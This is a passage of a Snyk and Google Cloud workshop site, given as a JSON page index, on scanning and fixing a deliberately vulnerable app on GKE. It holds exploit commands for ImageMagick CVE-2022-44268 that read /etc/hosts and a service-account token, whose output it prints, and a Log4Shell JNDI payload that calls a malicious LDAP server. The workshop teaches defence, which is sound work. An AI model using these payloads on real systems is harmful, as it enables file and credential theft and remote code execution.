[
{
	"uri": "/0_introduction.html",
	"title": "Container Modernization with Snyk",
	"tags": [],
	"description": "",
	"content": "Application Modernization with Snyk and GCP Welcome! In this workshop you will learn how to scan containerized applications on Google EKR using the Snyk Container CLI tool. We will learn about Open Source vulnerabilities introduced by your Container Base Image and your application dependencies.\nContainers enable you to separate your applications from your infrastructure so you can deliver software quickly. With containers, you can manage your infrastructure in the same ways you manage your applications. By taking advantage of standardized methodologies for shipping, testing, and deploying code quickly, you can significantly reduce the delay between writing code and running it in production.\nSnyk is a Cloud Native Application Security solution that enables developers and security teams to find and automatically fix vulnerabilities in your source code, Infrastructure as code templates, container images, kubernetes applications, and open source artifacts.\nLearning Objectives Scan container images for vulnerabilities using the Snyk CLI Integrating Snyk into your SCM system to find and fix Open Source vulnerabilities Who should take this workshop? Developers DevOps Engineers Solutions Architects Site Reliability Engineers (SRE\u0026rsquo;s) Anyone that loves containers and wants to learn more! "
},
{
	"uri": "/",
	"title": "Container Modernization with Snyk",
	"tags": [],
	"description": "",
	"content": "Application Modernization with Snyk and GCP Welcome! In this workshop you will learn how to scan containerized applications on Google GKE using the Snyk Container CLI tool. We will learn about Open Source vulnerabilities introduced by your Container Base Image and your application dependencies.\nContainers enable you to separate your applications from your infrastructure so you can deliver software quickly. With containers, you can manage your infrastructure in the same ways you manage your applications. By taking advantage of standardized methodologies for shipping, testing, and deploying code quickly, you can significantly reduce the delay between writing code and running it in production.\nSnyk is a Cloud Native Application Security solution that enables developers and security teams to find and automatically fix vulnerabilities in your source code, Infrastructure as code templates, container images, kubernetes applications, and open source artifacts.\nLearning Objectives Scan container images for vulnerabilities using the Snyk CLI Integrating Snyk into your SCM system to find and fix Open Source vulnerabilities Who should take this workshop? Developers DevOps Engineers Solutions Architects Site Reliability Engineers (SRE\u0026rsquo;s) Anyone that loves containers and wants to learn more! "
},
{
	"uri": "/10_prerequisites.html",
	"title": "Prerequisites",
	"tags": [],
	"description": "",
	"content": "Prerequisites Set up initial GCP and tools Deploy a GKE cluster Clone the sample application repo Snyk CLI "
},
{
	"uri": "/10_prerequisites/11_create_gcp_project.html",
	"title": "Set up initial GCP and tools",
	"tags": [],
	"description": "",
	"content": "Create a Google Cloud Platform (GCP) Account and Project Account creation (skip if you have a GCP account)\nOpen https://cloud.google.com in your browser.\nIf don\u0026rsquo;t already have a GCP account, click the \u0026ldquo;Start Free\u0026rdquo; button at the top-right and follow the prompts to create or log into your Google user account.\nYou can create an account with $300 of free Google Cloud credits good for 90 days, just follow the prompts to finish the account creation,.\nDownload the gcloud CLI tool (skip if gcloud is already installed on your workstation)\nFollow the instalation steps for your operating system to install the gcloud CLI tool.\nPart of gcloud setup includes creating a new GCP Project (or selecting from an existing one), whatever that project ID is, save it in an evironment variable here to simplify later steps\nexport GCP_PROJECT=snyk-workshop-project Associate your billing account to the new project Get a list of billing account ID':\ngcloud billing accounts list \u0026hellip; which should return something like:\nACCOUNT_ID NAME OPEN MASTER_ACCOUNT_ID 010101-1A2B3C-98765A My Billing Account True Copy the account ID value and past into the following to link it to your new project:\ngcloud billing projects link $GCP_PROJECT --billing-account 010101-1A2B3C-98765A billingAccountName: billingAccounts/010101-1A2B3C-98765A billingEnabled: true name: projects/snyk-devrel-workshop/billingInfo projectId: snyk-devrel-workshop Enable GCP API\u0026rsquo;s for GKE access Finally, we need to approve access to the GCP API\u0026rsquo;s needed for GKE work:\ngcloud services enable container.googleapis.com Operation \u0026#34;operations/acf.p2-344195889871-f2f72ad1-5e45-462b-9c28-26b9fc8f22ab\u0026#34; finished successfully. Configure your default region From Google\u0026rsquo;s list of regions, chose the best one for you and use it in the following:\nexport GCP_REGION=us-south1 # Replace this with your chosen region gcloud config set artifacts/location $GCP_REGION gcloud config set compute/region $GCP_REGION Install tools nessesary for this workshop kubectl and GKE plugin You\u0026rsquo;ll need to install kubectl command line tool to your local environment (if you don\u0026rsquo;t already have it).\nFollow the instructions for your operating system at https://kubernetes.io/docs/tasks/tools/\nYou also will need to install the gke-gcloud-auth-plugin for `kubectl``, follow the instructions for your operating system here: https://cloud.google.com/blog/products/containers-kubernetes/kubectl-auth-changes-in-gke\ngit You\u0026rsquo;ll need git to clone the repository for this workshop. Most reading this will probably already have it installed but just in case you don\u0026rsquo;t, see https://git-scm.com/book/en/v2/Getting-Started-Installing-Git for official instructions.\nDocker This workshop assumes you have a Docker (or compatible) runtime available to build and push container images. Docker Desktop or simply the docker cli tool are common choices for this, see https://docker.com for install details.\n"
},
{
	"uri": "/10_prerequisites/12_deploy_gke_cluster.html",
	"title": "Deploy a GKE cluster",
	"tags": [],
	"description": "",
	"content": "Now that you have all of the tools installed, let\u0026rsquo;s deploy a GKE Autopilot cluster so we have a platform to deploy our applications to. CLI Invocation Perhaps the easiest way to setup a GKE cluster is to run the command as shown below in your local terminal: gcloud container clusters create-auto snyk-cluster\nYou should get output that looks something like the following:\n$ gcloud container clusters create-auto snyk-cluster Creating cluster snyk-cluster in us-south1... Cluster is being health-checked (master is healthy)...done. Created [https://container.googleapis.com/v1/projects/snyk-devrel-workshop/zones/us-south1/clusters/snyk-cluster]. To inspect the contents of your cluster, go to: https://console.cloud.google.com/kubernetes/workload_/gcloud/us-south1/snyk-cluster?project=snyk-devrel-workshop-smalls-1 kubeconfig entry generated for snyk-cluster. NAME LOCATION MASTER_VERSION MASTER_IP MACHINE_TYPE NODE_VERSION NUM_NODES STATUS snyk-cluster us-south1 1.27.3-gke.100 34.174.41.138 e2-medium 1.27.3-gke.100 3 RUNNING This may take a few minutes to complete while GCP provisions and does health checks on the cluster resources.\nConfigure kubeconfig Confirm that you have access to your GKE cluster by running the following command: kubectl get nodes\nIf you have access you should see something like the following:\n$ kubectl get nodes NAME STATUS ROLES AGE VERSION gk3-hello-cluster-default-pool-7544a6ec-2s0b Ready \u0026lt;none\u0026gt; 18m v1.27.3-gke.100 gk3-hello-cluster-default-pool-f4aa75ff-905w Ready \u0026lt;none\u0026gt; 18m v1.27.3-gke.100 Troubleshooting If you are getting timeouts or errors when running the kubectl get nodes command, or if it is returning node names that are obviously not from your new GKE cluster you may have the wrong context configured for kubectl. Check this by running kubectl config get-contexts:\n$ kubectl config get-contexts CURRENT NAME CLUSTER AUTHINFO NAMESPACE demo kind-kind demo-sa docker-desktop docker-desktop docker-desktop * gke_snyk-devrel-workshop_us-south1_snyk-cluster gke_snyk-devrel-workshop_us-south1_snyk-cluster gke_snyk-devrel-workshop_us-south1_snyk-cluster goof goof goof If the * is not showing up next to the gke cluster, run kubectl config use-context gke_snyk-devrel-workshop_us-south1_snyk-cluster and try pulling the node list again. (replace that name as approrpriate)\n"
},
{
	"uri": "/10_prerequisites/16_clone_goof_repo.html",
	"title": "Clone the sample application repo",
	"tags": [],
	"description": "",
	"content": "Create your copy of the repo A sample application, called Goof, is provided for this workshop as a GitHub template. Navigate to the GitHub Repo for the Goof application and click \u0026ldquo;Use this Template\u0026rdquo; and then \u0026ldquo;Create a new repository\u0026rdquo; to create a copy of the Repo to your personal GitHub account.\nBe sure to name the new Repo goof otherwise things will break later on.\nWe recommend you make your copy have \u0026ldquo;public\u0026rdquo; visibility, it will simplify working with it during this workshop.\nTo copy-paste the commands in the instructions set an environment variable with your GitHub ID. Your GitHub ID is displayed in the upper right corner in GitHub.com.\nGithubId=\u0026lt;your_github_id\u0026gt; Clone the repo After you create the Repo, clone the Repo to your local environment by using the git clone command. Once the clone completes, change to the repo\u0026rsquo;s top level directory.\ngit clone https://github.com/$GithubId/goof \u0026amp;\u0026amp; cd goof This copies the Repo files to your local environment.\n"
},
{
	"uri": "/10_prerequisites/17_snyksetup.html",
	"title": "Snyk CLI",
	"tags": [],
	"description": "",
	"content": "Snyk Setup Instructions You will need a Snyk account to run scans. Snyk is available for free and all you need is a valid email address to register. Once you register, you can perform scans and view results locally or on the website.\nSetting up your Snyk Account Create or Login to Snyk account Login or Create a free account here.\nCreate Snyk Access Token Visit your Snyk account (Account Settings \u0026gt; API Token section) (https://app.snyk.io/account) In the KEY field, select click to show, then select and copy your API token from the field Paste the token that appears on the screen in a safe location for use in future modules You can read more about Snyk Access Token from their docs here.\nSetting up the Snyk CLI The Snyk Command-Line-Interface (CLI) is highly portable and very popular with end users. We’ll use the Snyk CLI in this workshop to collect and send results about your vulnerabilities.\nStart by downloading the Snyk CLI to your environment. In this workshop, we’ll prescribe steps to save time and you can find more details on the Snyk documentation site at: https://docs.snyk.io/snyk-cli/install-the-snyk-cli\nYou will need to authenticate on the CLI with your API token.\nBrowser based authentication If you are working on your local machine, simply run snyk auth and a browser should automatically open prompting you to authenticate. Accept that (logging in, if needed) and your CLI should show the following:\nYour account has been authenticated. Snyk is now ready to be used. Manual (non-browser based) authentication If you are running remotely and the automatic authentication is not available you can manually authenticate by navigating to your Snyk Account (https://app.snyk.io/account), and get your API_TOKEN by clicking into your Account Settings -\u0026gt; API Token section.\nIn the KEY field, click your “click to show” box to copy your API token.\nYou can then run this command where API_TOKEN is the value you copied.\nsnyk auth API_TOKEN. That should be it! Your response should look like the following:\nsnyk auth 12345678-abcd-efgh-1234head5678bead Your account has been authenticated. Snyk is now ready to be used. "
},
{
	"uri": "/20_build_deploy_goof.html",
	"title": "Module 1: Build the Goof applications",
	"tags": [],
	"description": "",
	"content": "Clone and Deploy the Sample Application Estimated Completion Time: 30 minutes\nIntroduction In this module we will build our sample applications, push their container images to Google Artifact Registry (GAR), and deploy the application to Gookge Kubernetes Engine (GKE). This will prepare us for Modules 2 and 3.\n"
},
{
	"uri": "/20_build_deploy_goof/21_build_goof_images.html",
	"title": "Step 1: Build the Goof container image",
	"tags": [],
	"description": "",
	"content": "Now that you\u0026rsquo;ve cloned the repo to your working environment, we\u0026rsquo;ll build a few container images that run our application examples in Google Kubernetes Engine (GKE) but before we can do anything, we need to create an Google Artifact Registry (GAR) repository to house the build images so GKE has somewhere to pull them from.\nCreate the repository The following command will create a repository for the images we will be building:\ngcloud artifacts repositories create snyk-workshop --repository-format=Docker After it finishes you should get a reponse with the following:\nCreated repository [snyk-workshop]. Log into your repositories Next, we log into our repositories (one command logs you into any of your repositories)\ngcloud auth configure-docker $GCP_REGION-docker.pkg.dev This should return a Login Succeeded repsonse.\nSet a variable up to hold the long Google repository string Google Artifact Registry repositories have fairly long names so to make like easier for the rest of this workshop, let\u0026rsquo;s create am environment variable to hold it. In the following, replace \u0026ldquo;PROJECT-NAME\u0026rdquo; and \u0026ldquo;REGION\u0026rdquo; with whatver your info:\nexport REPO=\u0026#34;$GCP_REGION-docker.pkg.dev/$GCP_PROJECT/snyk-workshop\u0026#34; Build container images Now we will build the images. Be sure you are cd\u0026rsquo;ed into the top level of the cloned goof repo directory and run the following commands to build the container images.\nThe following commands include --platform=linux/amd64 to ensure the correct CPU architecture is used for your GKE cluster. This is nessesary if your local workstation is not Intel/AMD based, i.e. Apple Silicon or Raspberry Pi. If you are on an Intel/AMD based workstation, you may omit that portion if you like.\ndocker build -t $REPO/thumbnailer:latest --platform=linux/amd64 thumbnailer docker build -t $REPO/todolist:latest --platform=linux/amd64 todolist docker build -t $REPO/log4shell-server:latest --platform=linux/amd64 todolist/exploits/log4shell-server When all of the build processes are complete, if you run docker images you should see three rows like this:\n$ docker images REPOSITORY TAG IMAGE ID CREATED SIZE us-south1-docker.pkg.dev/my-project/snyk-workshop/log4shell-server latest a42b0d443129 10 minutes ago 535MB us-south1-docker.pkg.dev/my-project/snyk-workshop/todolist latest 57ad8c044dbd 15 minutes ago 612MB us-south1-docker.pkg.dev/my-project/snyk-workshop/thumbnailer latest 3406c6d949b4 20 minutes ago 941MB Push container images to your Google Artifcat Registry Next, we will push the images to our registry:\ndocker push $REPO/thumbnailer:latest docker push $REPO/todolist:latest docker push $REPO/log4shell-server:latest Once the pushes complete, log in to your Google Artifact Registry to see your new image repositories (you\u0026rsquo;ll need to open the correct project and click on the snyk-workshop repositry to see the images).\n"
},
{
	"uri": "/20_build_deploy_goof/22_gke_deploy.html",
	"title": "Step 2: Deploy the application to GKE",
	"tags": [],
	"description": "",
	"content": "For this workshop we created a GKE cluster where we run the Goof apps and you are now going to deploy the applications we build into it.\nCreate and set context to a namespace We will be running these applications in a specific namespace.\n# Create a namespace kubectl create ns snyk-gke # Set the current context to use the new namespace kubectl config set-context --current --namespace snyk-gke Deploy the applications Ensure the REPO variable is still set from the build step and run this command. (it uses the envsubst utilities to plug your repository server into each of the deployment\u0026rsquo;s image tags)\ncat manifests/*.yaml | envsubst | kubectl apply -f - To check the status of the pods as the application comes up, use the following command:\nValidate they are running kubectl get all The output should look something like this:\n$ kubectl get all NAME READY STATUS RESTARTS AGE pod/thumbnailer-679f46cbb8-f64vd 1/1 Running 0 2m50s pod/todolist-ff547c66d-st55p 1/1 Running 0 2m50s NAME TYPE CLUSTER-IP EXTERNAL-IP PORT(S) AGE service/thumbnailer LoadBalancer 34.118.225.150 34.174.63.243 80:32052/TCP 2m53s service/todolist LoadBalancer 34.118.236.48 34.174.105.160 80:32217/TCP 2m52s NAME READY UP-TO-DATE AVAILABLE AGE deployment.apps/thumbnailer 1/1 1 1 2m53s deployment.apps/todolist 1/1 1 1 2m53s NAME DESIRED CURRENT READY AGE replicaset.apps/thumbnailer-679f46cbb8 1 1 1 2m52s replicaset.apps/todolist-ff547c66d 1 1 1 2m52s The pods should all show \u0026ldquo;Running\u0026rdquo; in their STATUS field, and services with a LoadBalancer type should have an IP or hostname for their EXTERNAL-IP. If either show a pending state, then wait a moment and re-run the command until they finish starting up.\nThe following will save the LoadBalancer services EXTERNAL_IP values for later use:\nTHUMBNAILER_LB=$(kubectl get svc thumbnailer -o jsonpath=\u0026#39;{.status.loadBalancer.ingress[0].ip}\u0026#39;) TODOLIST_LB=$(kubectl get svc todolist -o jsonpath=\u0026#39;{.status.loadBalancer.ingress[0].ip}\u0026#39;) Once both are running, the application is accessible from the web. Get the DNS name for your app running the following command.\necho $THUMBNAILER_LB echo $TODOLIST_LB Validate our Log4Shell exploit server is running The eagle-eyed amoung you probably noticed that only two deployments and services are shown in the above output but we built and deployed three images. Well, the third, as it\u0026rsquo;s name reveals, is a Log4Shell malicious LDAP server we will be using in a later section. We\u0026rsquo;ll discuss it more in a later section, but for now, just make sure it\u0026rsquo;s running by listing the deployments in the darkweb namespace:\nkubectl get all -n darkweb $ kubectl get all -n darkweb NAME READY STATUS RESTARTS AGE pod/log4shell-695d97d7bd-7bwkq 1/1 Running 0 6m5s NAME TYPE CLUSTER-IP EXTERNAL-IP PORT(S) AGE service/evil ClusterIP 34.118.226.121 \u0026lt;none\u0026gt; 9999/TCP 6m8s service/ldap ClusterIP 34.118.239.145 \u0026lt;none\u0026gt; 80/TCP 6m8s NAME READY UP-TO-DATE AVAILABLE AGE deployment.apps/log4shell 1/1 1 1 6m10s NAME DESIRED CURRENT READY AGE replicaset.apps/log4shell-695d97d7bd 1 1 1 6m8s Note: services in this namespace will not get external ips as they are not running as a loadbalancer type.\nSuccess! If you got here without issues, you\u0026rsquo;ve successfully built and deployed all of the applications and they are now live on GKE. We can open and interact with it, and while they looks harmless enough! In the next module we\u0026rsquo;ll demonstrate how a vulnerable open source compoenents can create an invisible risk that can comprimise our application.\n"
},
{
	"uri": "/30_secure_container.html",
	"title": "Module 2: Secure the Containers",
	"tags": [],
	"description": "",
	"content": "Securing your Container Base Image Estimated Completion Time: 30 minutes\nIntroduction In this module we will learn about Container Base Image vulnerabilities, and how to use the most secure base image possible for your application.\n"
},
{
	"uri": "/30_secure_container/31_container_exploit.html",
	"title": "Step 3: Exploit a Container Vulnerability",
	"tags": [],
	"description": "",
	"content": "Thumbnailer microservice Putting an application into a container does not automatically make it secure. To demonstrate the risks of a vulnerable component introduced by our container base image, we will exploit a vulnerability in the ImageMagick package present in the \u0026ldquo;thumbnailer\u0026rdquo; pod we\u0026rsquo;ve deployed to GKE.\nThumbnailer is a microservice written in Python that simply takes an uploaded image and returns a 100x100 scaled down thumbnail version. The application leverages the ImageMagick convert utility to do the work. This is very convenient since the official Python open source conatiner image comes with that tool pre-installed.\nExploit scenario We will be taking a simple png image file and making a metadata change to it and then will POST it to the Thumbnailer service. Then, we will inspect the returned image and see if any interesting information is embedded in it. The vulnerability we are targeting is CVE-2022-44268 which can allow an attacker to read the contents of a files on the host system via a bug in certain versions of ImageMagick.\nStep 1: Add metadata First we will add a \u0026ldquo;TEXT\u0026rdquo; record to an existing PNG image along with the path to whatever file we are trying to read from the targeted server, the pngcrush utility is pre-installed in your Cloud9 environment and script has been provided to simplify it\u0026rsquo;s use. The following example will set this up for the purpose of reading the /etc/hosts file on the target server:\ncd thumbnailer ./exploit.py encode k8s.png /etc/hosts \u0026hellip; which should return:\nEncoding /etc/hosts into k8s.png as encoded-k8s.png ... File encoded as encoded-k8s.png Step 2: Upload the image and get it\u0026rsquo;s thumbnail back Now that we have the payload in the image, run this command to ship it up to the thumbnailer service and get back the reduced-size version:\n./exploit.py upload encoded-k8s.png $THUMBNAILER_LB Sending encoded-k8s.png to 34.174.188.234... Thumbnailed image received as result.png``` Step 3: Decode the contents of the returned image Let\u0026rsquo;s see what we can find in the image we got back from the Thumbnailer\n$ ./exploit.py decode result.png Decoding content from /Users/me/goof/thumbnailer/result.png... # Kubernetes-managed hosts file. 127.0.0.1\tlocalhost ::1\tlocalhost ip6-localhost ip6-loopback fe00::0\tip6-localnet fe00::0\tip6-mcastprefix fe00::1\tip6-allnodes fe00::2\tip6-allrouters 10.96.0.66\tthumbnailer-679f46cbb8-f64vd That is the hosts file from the container running in our thumbnailer pod!\nThe impact of this vulnerability The hosts file of a pod may not be very interesting on it\u0026rsquo;s face, but imagine what else a clever hacker might start reading. For example, by what if we went after the serviceaccount token in the pod (which is always there by default):\n$ ./exploit.py encode k8s.png /var/run/secrets/kubernetes.io/serviceaccount/token Encoding /var/run/secrets/kubernetes.io/serviceaccount/token into k8s.png as encoded-k8s.png ... File encoded as encoded-k8s.png $ ./exploit.py upload encoded-k8s.png $THUMBNAILER_LB Sending encoded-k8s.png to 34.174.63.243... Thumbnailed image received as result.png $ ./exploit.py decode result.png Decoding content from /Users/me/goof/thumbnailer/result.png... eyJhbGciOiJSUzI1NiIsImtpZCI6ImV6amdZZUJkb1JfR2x2NlA1Sk5qWjlScUZXeE9INHdIOUN2c2lTV19OdTQifQ.eyJhdWQiOlsiaHR0cHM6Ly9jb250YWluZXIuZ29vZ2xlYXBpcy5jb20vdjEvcHJvamVjdHMvZGV2cmVsLXNtYWxsaW5nL2xvY2F0aW9ucy91cy1zb3V0aDEvY2x1c3RlcnMvaGVsbG8tY2x1c3RlciJdLCJleHAiOjE3MjYxMDQ3NjAsImlhdCI6MTY5NDU2ODc2MCwiaXNzIjoiaHR0cHM6Ly9jb250YWluZXIuZ29vZ2xlYXBpcy5jb20vdjEvcHJvamVjdHMvZGV2cmVsLXNtYWxsaW5nL2xvY2F0aW9ucy91cy1zb3V0aDEvY2x1c3RlcnMvaGVsbG8tY2x1c3RlciIsImt1YmVybmV0ZXMuaW8iOnsibmFtZXNwYWNlIjoic255ay1na2UiLCJwb2QiOnsibmFtZSI6InRodW1ibmFpbGVyLTY3OWY0NmNiYjgtZjY0dmQiLCJ1aWQiOiJkMWUyY2YxNy04NDc5LTQ4OGMtYTllNC1kMjZjY2Y5ZTJmNTUifSwic2VydmljZWFjY291bnQiOnsibmFtZSI6ImRlZmF1bHQiLCJ1aWQiOiI0NWQ4YTMzOC03MzIwLTRkYmQtOTQyNS01ZjVmZjYwNzJkYjMifSwid2FybmFmdGVyIjoxNjk0NTcyMzY3fSwibmJmIjoxNjk0NTY4NzYwLCJzdWIiOiJzeXN0ZW06c2VydmljZWFjY291bnQ6c255ay1na2U6ZGVmYXVsdCJ9.az3avpeqLi7Ul2qLmmaWBo6xfu3-pkVojc2uobZiqI2OCW-V5H9CJri2WPm0_TtEiGE87lYa3NhXeJg2fl9f3yoL6JrDYeo-GseRM0uV__JGR1f2dO2-NIFITN22tkUoQLheh5CY6trmiDWDJcEFBIWWGdXsn_uvylWAybNyuq5CeIwFeoTzxm2xpJnYGrfoM8HEkMQz_N1i7-UUe-I83YohxoOhkaplILren3PItk9c1sgA2_wvCyI5T-wVV2tt-GxGNpmqMd9pjyFs90-GJeOdWIxiloe6mSPOAIDsk4AVWbLYzIhYAlJBeYvLZeX7Diq1Ym2PF1Bu6hAg2n48zg That, my friend, is a credential that could be used in an attempt to expand an attack against your Kubernetes api server!\nNot the application\u0026rsquo;s fault The part of this example that developers, in particular, find most disturbing, is that the vulnerability is not nessesarily something wrong in the application code nor the libraries being pulled in. In this example, the vulnerabiltiy is in an operating system bundled package that came along for the ride in the base image chosen.\nNext step Continue to the next step to learn how to identify these, and other, vulnerabilities in your container images that are introduced by your container base image.\n"
},
{
	"uri": "/30_secure_container/32_image_recommendations.html",
	"title": "Step 4: Scan the Container Image for Vulnerabilities",
	"tags": [],
	"description": "",
	"content": "Scan the Container Image for Vulnerabilities Vulnerable components like the version of ImageMagick present in our container image can be identified by Snyk. Developers using the Snyk CLI can run snyk container test to scan containers to get vulnerability information and base image upgrade guidance.\nScan the image by running the following command (assuming you are cd\u0026rsquo;ed to the thumbnailer directory of your goof repo).\nsnyk container test $REPO/thumbnailer:latest --file=Dockerfile --exclude-app-vulns When the scan completes, review the list of vulnerabilities. There are quite a few!\n... Package manager: deb Target file: Dockerfile Project name: docker-image|us-south1-docker.pkg.dev/my-project/snyk-workshop/thumbnailer Docker image: us-south1-docker.pkg.dev/my-project/snyk-workshop/thumbnailer:latest Platform: linux/amd64 Base image: python:3.11.1 Licenses: enabled Tested 427 dependencies for known issues, found 385 issues. Base Image Vulnerabilities Severity python:3.11.1 385 6 critical, 21 high, 71 medium, 287 low Recommendations for base image upgrade: Minor upgrades Base Image Vulnerabilities Severity python:3.12.0rc1 169 0 critical, 0 high, 1 medium, 168 low Alternative image types Base Image Vulnerabilities Severity python:3.12.0rc1-slim-bookworm 38 0 critical, 0 high, 0 medium, 38 low python:3.12.0b4-slim 38 0 critical, 0 high, 0 medium, 38 low python:3.12.0rc1-slim-bullseye 59 0 critical, 0 high, 0 medium, 59 low python:3.11.4-bookworm 170 0 critical, 0 high, 2 medium, 168 low ... As you can see, the Snyk engine is recommending we consider upgrading to newer base images that have fixes for many of the issues found in ours. If you search the output of the scan, you also can see that our CVE is, indeed in this base image.\n✗ Medium severity vulnerability found in imagemagick/imagemagick-6-common Description: CVE-2022-44268 Info: https://security.snyk.io/vuln/SNYK-DEBIAN11-IMAGEMAGICK-3314444 Introduced through: imagemagick/libmagickcore-dev@8:6.9.11.60+dfsg-1.3, imagemagick/libmagickwand-dev@8:6.9.11.60+dfsg-1.3, imagemagick@8:6.9.11.60+dfsg-1.3 From: imagemagick/libmagickcore-dev@8:6.9.11.60+dfsg-1.3 \u0026gt; imagemagick/imagemagick-6-common@8:6.9.11.60+dfsg-1.3 From: imagemagick/libmagickwand-dev@8:6.9.11.60+dfsg-1.3 \u0026gt; imagemagick/imagemagick-6-common@8:6.9.11.60+dfsg-1.3 From: imagemagick@8:6.9.11.60+dfsg-1.3 \u0026gt; imagemagick/imagemagick-6.q16@8:6.9.11.60+dfsg-1.3 \u0026gt; imagemagick/libmagickcore-6.q16-6@8:6.9.11.60+dfsg-1.3 \u0026gt; imagemagick/imagemagick-6-common@8:6.9.11.60+dfsg-1.3 and 24 more... Image layer: Introduced by your base image (python:3.11.1) Fixed in: 8:6.9.11.60+dfsg-1.3+deb11u1 Fixing our image Let\u0026rsquo;s take Snyk\u0026rsquo;s recommendation and upgrade our base image:\nDouble click on the Dockerfile under the thumbnailer directory in your Cloud9 IDE sidebar and change the first line from:\nFROM python:3.11.1 To:\nFROM python:3.12.0rc1 Now, rebuild the image:\ndocker build -t $REPO/thumbnailer . --platform=linux/amd64 \u0026hellip; and let\u0026rsquo;s re-scan it:\nsnyk container test $REPO/thumbnailer --file=Dockerfile --exclude-app-vulns The results now should show the lower vulnerability count.\n... Package manager: deb Target file: Dockerfile Project name: docker-image|us-south1-docker.pkg.dev/my-project/snyk-workshop/thumbnailer Docker image: us-south1-docker.pkg.dev/my-project/snyk-workshop/thumbnailer:latest Platform: linux/amd64 Base image: python:3.12.0rc1 Licenses: enabled Tested 430 dependencies for known issues, found 169 issues. Base Image Vulnerabilities Severity python:3.12.0rc1 169 0 critical, 0 high, 1 medium, 168 low Recommendations for base image upgrade: Alternative image types Base Image Vulnerabilities Severity python:3.12.0rc1-slim-bookworm 38 0 critical, 0 high, 0 medium, 38 low python:3.12.0b4-slim 38 0 critical, 0 high, 0 medium, 38 low python:3.12.0rc1-slim-bullseye 59 0 critical, 0 high, 0 medium, 59 low If you search through the output, you should find our ImageMagick CVE is gone.\nAbout the recomendations Snyk recommends less vulnerable base images grouped by how likely they are to be compatible:\nMinor upgrades are the most likely to be compatible with little work, Major upgrades can introduce breaking changes depending on image usage, Alternative architecture images are shown for more technical users to investigate. "
},
{
	"uri": "/30_secure_container/34_redeploy_test.html",
	"title": "Step 5: Re-deploy the Application to test the fix",
	"tags": [],
	"description": "",
	"content": "With our image rebuilt, let\u0026rsquo;s push it up to GAR and redeploy the more secure build of the application\nPush to Google Artifact Registry docker push $REPO/thumbnailer:latest Re-deploy the Application to GKE Now that the newer image is in the repo, deploy it to GKE by scaling the goof deployment with kubectl. The deployment\u0026rsquo;s ImagePullPolicy forces GKE to pull the latest image from the registry.\nkubectl scale deployment thumbnailer --replicas=0 kubectl scale deployment thumbnailer --replicas=1 Wait for the pod to start\u0026hellip; Check for the pod to return to \u0026ldquo;Running\u0026rdquo; state with kubectl get pod\nkubectl get pod $ kubectl get pod NAME READY STATUS RESTARTS AGE thumbnailer-6bbfb9cb98-p8956 0/1 ContainerCreating 0 11s ... $ kubectl get pod NAME READY STATUS RESTARTS AGE thumbnailer-6bbfb9cb98-p8956 1/1 Running 0 50s ... Run the ImageMagick Exploit again to verify the fix. Re-upload the encoded image:\n./exploit.py upload encoded-k8s.png $THUMBNAILER_LB And then try to decode the result:\n./exploit.py decode result.png Decoding content from /Users/me/goof/thumbnailer/result.png... Traceback (most recent call last): File \u0026#34;./exploit.py\u0026#34;, line 51, in \u0026lt;module\u0026gt; print(decode_png(png_file=sys.argv[2])) File \u0026#34;./exploit.py\u0026#34;, line 31, in decode_png start_raw_data = [\u0026#34;Raw profile type:\u0026#34; in line for line in lines].index(True) + 3 ValueError: True is not in list The error is because the block in the png metadata that container the payload no longer exists so we can see that the imagemagick exploit no longer works, and our container image is more secure than it was when we started.\nThis is one example of how a vulnerable component introduced by the container base image can have serious security implications. Without scanning it for vulnerabilities, the app works and looks harmless, but can leave a security hole in your infrastructure. Well done!\nIn the next module, we\u0026rsquo;ll demonstrate how the open source components in our application also open up security holes that can be exploited in our running application.\n"
},
{
	"uri": "/40_secure_application.html",
	"title": "Module 3: Secure the application",
	"tags": [],
	"description": "",
	"content": "DevSecOps with Snyk Estimated Completion Time: 30 minutes\nIntroduction Besides vulnerabilities in the Container Base Image, Snyk also identifies vulnerabilities introduced by the Open Source components in the application. In this module we will learn about Security issues introduced by Open Source dependencies and how to address them with Snyk.\n"
},
{
	"uri": "/40_secure_application/41_integrate_github.html",
	"title": "Step 6: Monitor your Repo with Snyk",
	"tags": [],
	"description": "",
	"content": "Integrate Snyk with the Goof GitHub Repo To check for issues in the application\u0026rsquo;s Open Source dependencies, in this example we will use the Snyk GitHub integration to connect Snyk to the application\u0026rsquo;s GitHub Repository.\nSet up GitHub integration Log in to Snyk.io. Sign up if you haven\u0026rsquo;t already. If this is the first time you\u0026rsquo;ve used your Snyk account on the website, you may see a screen like this. If so, go ahead and click the \u0026ldquo;Skip for now\u0026rdquo; link at the top-right corner of the page. Navigate to Integrations -\u0026gt; Source Control -\u0026gt; GitHub Fill in your Account Credentials to Connect your GitHub Account. Import the Goof Repo into Snyk Now that Snyk is connected to your GitHub Account, import the Repo into Snyk as a Project.\nClick on Projects Click \u0026ldquo;Add Project\u0026rdquo; then select \u0026ldquo;GitHub\u0026rdquo; 3. Select the repo for the Goof application and click the \u0026ldquo;Add selected repositories\u0026rdquo; button at the top-right corner of the page.\nReview the list of Vulnerabilities When the import completes, Snyk displays the issue counts next to the files that introduced the issues. Issues in the Open Source components in our Goof app are displayed, the one we will be looking at are in the Maven todolist/todolist-web-struts/pom.xml file.\nBefore investigating the issues, let\u0026rsquo;s explore an example of the invisible risks Open Source components can bundle into our application.\n"
},
{
	"uri": "/40_secure_application/42_opensource_exploit.html",
	"title": "Step 7: Exploit a Vulnerable Open Source component",
	"tags": [],
	"description": "",
	"content": "Exploiting an RCE vulnerability in the TodoList application. The Goof repo TodoList application includes various exploits to demonstrate the risks of open source vulnerabilities. We\u0026rsquo;ll demonstrate the infamous Log4Shell vulnerability as an example of an extremenly profific open source package with a critical CVE that was relatively easy to exploit and gives malicous actors a remote code execution (RCE) vector of attack.\nOpen the website This example is best exploited from your browser so open a tab and navigate to the todolist application\u0026rsquo;s loadbalancer address with /todolist appended to it. That hostname was stored in the TODOLIST_LB variable during a prior section so you can easily get a string for the URL by echoing it out like this:\necho $TODOLIST_LB/todolist 34.174.166.26/todolist When you open that URL in your browser, you should see the ToDoList welcome page Log into the app Click \u0026ldquo;Sign in\u0026rdquo; and log into the form with the following pre-populated user account:\nUser: foo@bar.org Password: foobar Trigger the exploit In the search field enter the following string ${jndi:ldap://ldap.darkweb:80/#Vandalize} and submit the search. Vandalized! Immediately*, you can see that the header for the entire site has been modified to show a the hacker equivelent of graphiti! * Sometimes the hacked header can take a few seconds to appear, if you don\u0026rsquo;t see the hacked page header immediately, try refreshing the page and/or navigating to another page in the app.\nWhat? Why? A full rundown of the Log4Shell issue is out of scope for this workshop but the high level description is:\nThis application is pulling in an older version of the 